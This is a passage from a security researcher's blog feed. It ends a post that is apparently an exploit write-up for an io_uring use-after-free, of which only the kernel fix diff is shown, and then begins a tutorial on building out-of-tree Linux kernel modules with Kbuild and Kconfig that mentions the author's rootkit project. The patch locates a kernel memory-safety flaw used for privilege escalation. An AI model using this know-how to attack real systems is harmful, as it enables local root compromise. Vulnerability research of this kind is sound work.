class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-comment">diff --git a/include/linux/io_uring_types.h b/include/linux/io_uring_types.h</span><br><span class="hljs-comment">index d3009d56af0ba3..805bb635cdf558 100644</span><br><span class="hljs-comment">--- a/include/linux/io_uring_types.h</span><br><span class="hljs-comment">+++ b/include/linux/io_uring_types.h</span><br><span class="hljs-meta">@@ -340,6 +340,9 @@</span> struct io_ring_ctx &#123;<br> <br> struct list_headio_buffers_cache;<br> <br><span class="hljs-addition">+/* deferred free list, protected by -&gt;uring_lock */</span><br><span class="hljs-addition">+struct hlist_headio_buf_list;</span><br><span class="hljs-addition">+</span><br> /* Keep this last, we don&#x27;t need it for the fast path */<br> struct wait_queue_headpoll_wq;<br> struct io_restrictionrestrictions;<br><span class="hljs-comment">diff --git a/io_uring/io_uring.c b/io_uring/io_uring.c</span><br><span class="hljs-comment">index e40b1143821045..3a216f0744dd66 100644</span><br><span class="hljs-comment">--- a/io_uring/io_uring.c</span><br><span class="hljs-comment">+++ b/io_uring/io_uring.c</span><br><span class="hljs-meta">@@ -325,6 +325,7 @@</span> static __cold struct io_ring_ctx *io_ring_ctx_alloc(struct io_uring_params *p)<br> INIT_LIST_HEAD(&amp;ctx-&gt;sqd_list);<br> INIT_LIST_HEAD(&amp;ctx-&gt;cq_overflow_list);<br> INIT_LIST_HEAD(&amp;ctx-&gt;io_buffers_cache);<br><span class="hljs-addition">+INIT_HLIST_HEAD(&amp;ctx-&gt;io_buf_list);</span><br> io_alloc_cache_init(&amp;ctx-&gt;rsrc_node_cache, IO_NODE_ALLOC_CACHE_MAX,<br>     sizeof(struct io_rsrc_node));<br> io_alloc_cache_init(&amp;ctx-&gt;apoll_cache, IO_ALLOC_CACHE_MAX,<br><span class="hljs-meta">@@ -2950,6 +2951,7 @@</span> static __cold void io_ring_ctx_free(struct io_ring_ctx *ctx)<br> ctx-&gt;mm_account = NULL;<br> &#125;<br> io_rings_free(ctx);<br><span class="hljs-addition">+io_kbuf_mmap_list_free(ctx);</span><br> <br> percpu_ref_exit(&amp;ctx-&gt;refs);<br> free_uid(ctx-&gt;user);<br><span class="hljs-comment">diff --git a/io_uring/kbuf.c b/io_uring/kbuf.c</span><br><span class="hljs-comment">index a1e4239c7d75d1..85e680fc74ce2c 100644</span><br><span class="hljs-comment">--- a/io_uring/kbuf.c</span><br><span class="hljs-comment">+++ b/io_uring/kbuf.c</span><br><span class="hljs-meta">@@ -33,6 +33,11 @@</span> struct io_provide_buf &#123;<br> __u16bid;<br> &#125;;<br> <br><span class="hljs-addition">+struct io_buf_free &#123;</span><br><span class="hljs-addition">+struct hlist_nodelist;</span><br><span class="hljs-addition">+void*mem;</span><br><span class="hljs-addition">+&#125;;</span><br><span class="hljs-addition">+</span><br> static inline struct io_buffer_list *io_buffer_get_list(struct io_ring_ctx *ctx,<br> unsigned int bgid)<br> &#123;<br><span class="hljs-meta">@@ -223,7 +228,10 @@</span> static int __io_remove_buffers(struct io_ring_ctx *ctx,<br> if (bl-&gt;is_mapped) &#123;<br> i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;<br> if (bl-&gt;is_mmap) &#123;<br><span class="hljs-deletion">-folio_put(virt_to_folio(bl-&gt;buf_ring));</span><br><span class="hljs-addition">+/*</span><br><span class="hljs-addition">+ * io_kbuf_list_free() will free the page(s) at</span><br><span class="hljs-addition">+ * -&gt;release() time.</span><br><span class="hljs-addition">+ */</span><br> bl-&gt;buf_ring = NULL;<br> bl-&gt;is_mmap = 0;<br> &#125; else if (bl-&gt;buf_nr_pages) &#123;<br><span class="hljs-meta">@@ -531,18 +539,28 @@</span> error_unpin:<br> return -EINVAL;<br> &#125;<br> <br><span class="hljs-deletion">-static int io_alloc_pbuf_ring(struct io_uring_buf_reg *reg,</span><br><span class="hljs-addition">+static int io_alloc_pbuf_ring(struct io_ring_ctx *ctx,</span><br><span class="hljs-addition">+      struct io_uring_buf_reg *reg,</span><br>       struct io_buffer_list *bl)<br> &#123;<br><span class="hljs-deletion">-gfp_t gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;</span><br><span class="hljs-addition">+struct io_buf_free *ibf;</span><br> size_t ring_size;<br> void *ptr;<br> <br> ring_size = reg-&gt;ring_entries * sizeof(struct io_uring_buf_ring);<br><span class="hljs-deletion">-ptr = (void *) __get_free_pages(gfp, get_order(ring_size));</span><br><span class="hljs-addition">+ptr = io_mem_alloc(ring_size);</span><br> if (!ptr)<br> return -ENOMEM;<br> <br><span class="hljs-addition">+/* Allocate and store deferred free entry */</span><br><span class="hljs-addition">+ibf = kmalloc(sizeof(*ibf), GFP_KERNEL_ACCOUNT);</span><br><span class="hljs-addition">+if (!ibf) &#123;</span><br><span class="hljs-addition">+io_mem_free(ptr);</span><br><span class="hljs-addition">+return -ENOMEM;</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-addition">+ibf-&gt;mem = ptr;</span><br><span class="hljs-addition">+hlist_add_head(&amp;ibf-&gt;list, &amp;ctx-&gt;io_buf_list);</span><br><span class="hljs-addition">+</span><br> bl-&gt;buf_ring = ptr;<br> bl-&gt;is_mapped = 1;<br> bl-&gt;is_mmap = 1;<br><span class="hljs-meta">@@ -599,7 +617,7 @@</span> int io_register_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg)<br> if (!(reg.flags &amp; IOU_PBUF_RING_MMAP))<br> ret = io_pin_pbuf_ring(&amp;reg, bl);<br> else<br><span class="hljs-deletion">-ret = io_alloc_pbuf_ring(&amp;reg, bl);</span><br><span class="hljs-addition">+ret = io_alloc_pbuf_ring(ctx, &amp;reg, bl);</span><br> <br> if (!ret) &#123;<br> bl-&gt;nr_entries = reg.ring_entries;<br><span class="hljs-meta">@@ -649,3 +667,19 @@</span> void *io_pbuf_get_address(struct io_ring_ctx *ctx, unsigned long bgid)<br> <br> return bl-&gt;buf_ring;<br> &#125;<br><span class="hljs-addition">+</span><br><span class="hljs-addition">+/*</span><br><span class="hljs-addition">+ * Called at or after -&gt;release(), free the mmap&#x27;ed buffers that we used</span><br><span class="hljs-addition">+ * for memory mapped provided buffer rings.</span><br><span class="hljs-addition">+ */</span><br><span class="hljs-addition">+void io_kbuf_mmap_list_free(struct io_ring_ctx *ctx)</span><br><span class="hljs-addition">+&#123;</span><br><span class="hljs-addition">+struct io_buf_free *ibf;</span><br><span class="hljs-addition">+struct hlist_node *tmp;</span><br><span class="hljs-addition">+</span><br><span class="hljs-addition">+hlist_for_each_entry_safe(ibf, tmp, &amp;ctx-&gt;io_buf_list, list) &#123;</span><br><span class="hljs-addition">+hlist_del(&amp;ibf-&gt;list);</span><br><span class="hljs-addition">+io_mem_free(ibf-&gt;mem);</span><br><span class="hljs-addition">+kfree(ibf);</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-addition">+&#125;</span><br><span class="hljs-comment">diff --git a/io_uring/kbuf.h b/io_uring/kbuf.h</span><br><span class="hljs-comment">index f2d615236b2cb9..6c7646e6057cf5 100644</span><br><span class="hljs-comment">--- a/io_uring/kbuf.h</span><br><span class="hljs-comment">+++ b/io_uring/kbuf.h</span><br><span class="hljs-meta">@@ -51,6 +51,8 @@</span> int io_provide_buffers(struct io_kiocb *req, unsigned int issue_flags);<br> int io_register_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg);<br> int io_unregister_pbuf_ring(struct io_ring_ctx *ctx, void __user *arg);<br> <br><span class="hljs-addition">+void io_kbuf_mmap_list_free(struct io_ring_ctx *ctx);</span><br><span class="hljs-addition">+</span><br> unsigned int __io_put_kbuf(struct io_kiocb *req, unsigned issue_flags);<br> <br> bool io_kbuf_recycle_legacy(struct io_kiocb *req, unsigned issue_flags);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Pwn 完一结算 io_uring 得了 MVP！mmap 就是躺赢狗！&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="提权" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="IO_URING" scheme="https://arttnba3.github.io/tags/IO-URING/"/>
    
  </entry>
  
  <entry>
    <title>【DEV.0x01】如何优雅地开发树外内核模块</title>
    <link href="https://arttnba3.github.io/2025/01/12/DEV-0X01-LKM_WITH_KBUILD_DKMS/"/>
    <id>https://arttnba3.github.io/2025/01/12/DEV-0X01-LKM_WITH_KBUILD_DKMS/</id>
    <published>2025-01-12T08:22:33.000Z</published>
    <updated>2025-03-11T10:27:16.604Z</updated>
    
    <content type="html"><![CDATA[<p>我在 5:20 make install—— 13：14 准时 kernel panic</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>虽然说已经做了这么多年的内核开发（？）了，但是笔者开发的内核模块一般都仅局限于极其狭隘的特定用途（例如写点 <a href="https://github.com/arttnba3/Nornir-Rootkit">小 rootkit</a> 之类的），也没咋组织过比较优雅的代码结构，基本上都是一个丑陋的 Makefile 包办一切，需要这个内核模块的时候直接粗糙地手动 <code>insmod</code> ——能用是能用，但确实也就局限于自用了：（</p><p>因此这篇博客主要讲讲如何使用 <a href="https://docs.kernel.org/kbuild/kbuild.html">Kbuild</a> 组织代码并使用 <a href="https://github.com/dell/dkms">DKMS</a> 等工具优雅地开发与打包一个 out-of-tree 的 Linux 内核模块</p><h1 id="0x01-基本的内核模块"><a href="#0x01-基本的内核模块" class="headerlink" title="0x01. 基本的内核模块"></a>0x01. 基本的内核模块</h1><p>我们首先写一个基础的内核模块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><br><span class="hljs-type">static</span> __init <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;Hello kernel world!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> __exit <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;Goodbye kernel world!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>下面我们开始搭建模块源码文件结构，组织如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── Makefile<br>└── src<br>    ├── Kbuild<br>    └── main.c<br><br>2 directories, 3 files<br></code></pre></td></tr></table></figure><h2 id="使用-Kbuild-组织源码文件"><a href="#使用-Kbuild-组织源码文件" class="headerlink" title="使用 Kbuild 组织源码文件"></a>使用 Kbuild 组织源码文件</h2><h3 id="基础的-Kbuild-Makefile-示例"><a href="#基础的-Kbuild-Makefile-示例" class="headerlink" title="基础的 Kbuild &amp; Makefile 示例"></a>基础的 Kbuild &amp; Makefile 示例</h3><p><a href="https://docs.kernel.org/kbuild/kbuild.html">Kbuild</a> 是 Linux kernel 构建系统的一部分，简而言之，当我们在源码目录下编写了 <code>Kbuild</code> 文件之后，在编译时 Linux kernel 的编译基础设施便会根据 <code>Kbuild</code> 来自动地编译好我们的内核模块，若没有 <code>Kbuild</code> 则会选择寻找 <code>Makefile</code> </p><p>相比起把所有待编译文件与配置都写到一个 Makefile 里（例如 <a href="https://github.com/NVIDIA/open-gpu-kernel-modules">nvidia-open</a> 便是这么做的，看起来并不美观），拆分到多级 Makefile 当中通常是更易于维护的做法，而使用 Kbuild 组织编译结构则是更加优雅的一种方式</p><p>下面是一个最基础的 Kbuild 文件的示例，语法上有点类似于 Makefile：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br></code></pre></td></tr></table></figure><p>各符号说明如下：</p><ul><li><p><code>MODULE_NAME</code> ：一个简单的自定义变量，我们用来定义我们的模块名</p></li><li><p><code>obj-m</code> ：这个符号用来指定要被编译的内核模块列表，<code>+=</code> 意味着添加上我们的内核模块，而 <code>$(MODULE_NAME).o</code> 则是我们的内核模块编译的后期产物，这通常由单个或多个目标文件合并而成，最后会被链接为 <code>$(MODULE_NAME).ko</code> 文件，也就是我们所熟悉的 LKM ELF</p><blockquote><p>如果要将模块编译进内核 ELF 文件（vmlinux）中，则应当使用 <code>obj-y</code></p></blockquote></li><li><p><code>ccflags-y</code> ：<code>ccflags</code> 意味着编译选项，<code>-y</code> 意味着开启的编译选项，这里我们添加了 <code>-I</code> 选项以引入我们自己的头文件目录，更多编译选项可以参见 <a href="https://gcc.gnu.org/onlinedocs/gcc/Invoking-GCC.html">GCC 的文档</a></p></li><li><p><code>$(MODULE_NAME)-y</code> ：<code>$(MODULE_NAME).o</code>所需要的目标文件，<code>-y</code> 意味着编译过程需要该文件，这里我们加入了一个 <code>main.o</code> ，意味着我们的源码目录下应当有一个 <code>main.c</code></p></li></ul><p>注意到这里有很多的 <code>-字符</code> ，这个设定其实是为了让我们灵活地配置编译选项，例如我们可以将 <code>-y</code> 替换为 <code>-$(某个变量名)</code> ，从而在该变量为 <code>y</code> 的时候才包含该选项，例如以下示例意味着在选项配置中包含 <code>CONFIG_X86_64=y</code> 时才会在模块中编译入 <code>x86_64_tools.c</code> ：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_X86_64)</span> += x86_64_tools.o<br></code></pre></td></tr></table></figure><p>这同样适用于对内核模块的配置，对于树内模块，我们可以在 <code>.config</code> 文件当中配置某个指定变量的值为 <code>=y</code> 或 <code>=m</code> ，从而决定将该模块编译进内核或是作为独立的 ELF 存在，例如以下示例意味着这个模块是否编译进内核由变量 <code>CONFIG_MY_A3KMODULE</code> 的值决定：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs makefile">A3KMODULE_NAME ?= a3kmod<br>obj-<span class="hljs-variable">$(CONFIG_MY_A3KMODULE)</span> += <span class="hljs-variable">$(A3KMODULE_NAME)</span>.o<br></code></pre></td></tr></table></figure><p>相应地，由于我们已经在 Kbuild 当中指示了模块的构建行为，我们只需要在源码根目录的 Makefile 当中写入通用性内容，这里我们的 Makefile 写入如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><span class="hljs-comment"># Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><br>A3KMOD_ROOT_DIR=<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br>A3KMOD_SRC_DIR=<span class="hljs-variable">$(A3KMOD_ROOT_DIR)</span>/src<br>LINUX_KERNEL_SRC=/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br><br><span class="hljs-section">all:</span><br>@<span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(A3KMOD_SRC_DIR)</span> modules<br><br><span class="hljs-section">clean:</span><br>@<span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(LINUX_KERNEL_SRC)</span> M=<span class="hljs-variable">$(A3KMOD_SRC_DIR)</span> clean<br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><br></code></pre></td></tr></table></figure><p>简要说明如下（想更详细了解可自行深入学习 Makefile 语法）：</p><ul><li><code>A3KMOD_ROOT_DIR</code> 、 <code>A3KMOD_SRC_DIR</code> ：这些变量指定了源码目录为当前目录下的 <code>src</code> 文件夹，<code>$(shell pwd)</code> 意味着其值为 <code>pwd</code> 命令的结果</li><li><code>LINUX_KERNEL_SRC</code> ：这个变量指定了 Linux 内核源码目录，对于绝大多数 Linux 发行版而言，在安装了相应的软件包（例如 <code>linux-headers</code> ）后，在 <code>/lib/modules/$(shell uname -r)/build</code> 目录下都会存放着当前所用内核的源码以及编译系统文件，其中 <code>$(shell uname -r)</code> 意味着其值为 <code>uname -r</code> 的结果</li><li><code>all:</code> ：名为 <code>all</code> 的标签，在执行 <code>make all</code> 时会执行该标签下的命令，由于这是 Makefile 中的第一个命令，所以直接执行 <code>make</code> 默认会运行该命令<ul><li><code>@$(MAKE)</code> ：<code>@$(MAKE)</code> 指定了使用当前环境中的 <code>MAKE</code> 命令（这意味着我们在运行 <code>make</code> 命令时可以可以通过指定 <code>MAKE=</code> 更改其路径，默认值是 <code>make</code> ）</li><li><code> -C $(LINUX_KERNEL_SRC)</code> ：make 指令进入到内核源码目录进行</li><li><code>modules</code> ：执行内核源码 Makefile 中的 <code>modules</code> 项，意味着进行内核模块编译行为</li><li><code>M=$(A3KMOD_SRC_DIR)</code>：指定参数 <code>M</code> 的值，对 <code>modules</code> 项而言代表要编译的内核模块的源码路径</li></ul></li><li><code>clean:</code> ：和 <code>all</code> 标签传递的基本一致，不同在于最后执行的行为是 <code>clean</code> ，意味着清理编译产物</li><li><code>.PHONY</code>：“伪目标”，即相比同名文件而言优先找 Makefile 中的标签定义，这里将 <code>clean</code> 标签声明为伪目标</li></ul><h3 id="多级目录的多级-Kbuild-组织"><a href="#多级目录的多级-Kbuild-组织" class="headerlink" title="多级目录的多级 Kbuild 组织"></a>多级目录的多级 Kbuild 组织</h3><p>鉴于绝大部分的内核模块s都是各种不同类型设备的驱动，他们通常都只有单级结构，但不乏有一些场景会需要结构设计较为复杂的内核模块，如果把所有源码文件都堆到同一级子目录下未免不太雅观，因此根据代码架构设计拆分到不同的多级目录中是较为常见的做法，而文件一多起来再将所有编译配置选项都放到同一个 Kbuild 或是 Makefile 当中对维护者而言自然是一种地狱般的体验（例如应该不太会有人想去细看<a href="https://github.com/NVIDIA/open-gpu-kernel-modules/blob/main/src/nvidia/srcs.mk">这个文件</a>）</p><p>因此拆分成多级 Kbuild 文件在软件工程中通常是比较恰当的做法，我们以如下代码目录作为示例讲解：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── Makefile<br>└── src<br>    ├── Kbuild<br>    ├── main.c<br>    └── sub<br>        ├── Kbuild<br>        ├── sub.c<br>        └── sub_sub<br>            ├── Kbuild<br>            └── sub_sub.c<br><br>4 directories, 7 files<br></code></pre></td></tr></table></figure><p>首先是 <code>src/sub/sub_sub</code> 目录，我们使用 <code>Kbuild</code> 文件配置这个子目录下需要编译的文件，这里简单编写如下，需要注意的是这里应当和源码根目录下的 Kbuild 一样以源码根目录文件作为相对根目录（后面我们会解释为什么）：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += sub/sub_sub/sub_sub.o<br></code></pre></td></tr></table></figure><p>在 <code>src/sub/sub_sub/sub_sub.c</code> 当中我们简单定义一个打印函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub_sub!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是 <code>src/sub</code> 目录，我们使用 <code>Kbuild</code> 文件配置这个子目录下需要编译的文件，同样是以源码根目录文件作为相对根目录来包含入咱们的 <code>sub.c</code> 源码文件，但在此之外我们额外地使用 <code>include</code> 语句<strong>将 sub_sub 目录的 Kbuild 文件包含到该文件当中</strong>：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += sub/sub.o<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/sub_sub/Kbuild<br></code></pre></td></tr></table></figure><p>在 <code>src/sub/sub.c</code> 当中我们同样简单定义一个打印函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub!\n&quot;</span>);<br>    foo_sub_sub();<br>&#125;<br> <br></code></pre></td></tr></table></figure><p>现在大家应该明白为什么以源码根目录文件作为相对根目录，因为我们最终要在源码根目录下的 <code>Kbuild</code> 文件当中 <code>include</code> 下一级子目录的 <code>Kbuild</code> 文件，<strong>通过多级包含的方式完成多级 Kbuild 的配置</strong> ，根目录下的 Kbuild 便<strong>仅需要包含次一级子目录的 Kbuild 文件</strong>，而无需再去管理更细的细节：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br><br><span class="hljs-comment"># sub directory</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/Kbuild<br><br></code></pre></td></tr></table></figure><h2 id="使用-Kconfig-配置动态编译选项"><a href="#使用-Kconfig-配置动态编译选项" class="headerlink" title="使用 Kconfig 配置动态编译选项"></a>使用 Kconfig 配置动态编译选项</h2><p>现在我们来看 <a href="https://docs.kernel.org/kbuild/kconfig-language.html">Kconfig</a> ——内核的编译选项配置系统，在我们编译内核时通常需要先 <code>make menuconfig</code> 创建配置文件 <code>.config</code> ，其中便包含了配置选项，这些选项会被 Kconfig 系统解析给编译器，通过宏定义的方式作用于源代码，例如下面这个配置决定了是否启用 procfs 文件系统：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_PROC_FS</span>=y<br></code></pre></td></tr></table></figure><p>在内核或是驱动源码中便可以根据是否定义了 <code>CONFIG_PROC_FS</code> 宏来决定是否将 procfs 相关的代码编译进来，以 <code>arch/arm/kernel/dma.c</code> 为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PROC_FS</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proc_dma_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; MAX_DMA_CHANNELS ; i++) &#123;<br><span class="hljs-type">dma_t</span> *dma = dma_channel(i);<br><span class="hljs-keyword">if</span> (dma &amp;&amp; dma-&gt;lock)<br>seq_printf(m, <span class="hljs-string">&quot;%2d: %s\n&quot;</span>, i, dma-&gt;device_id);<br>&#125;<br><span class="hljs-keyword">return</span> <span 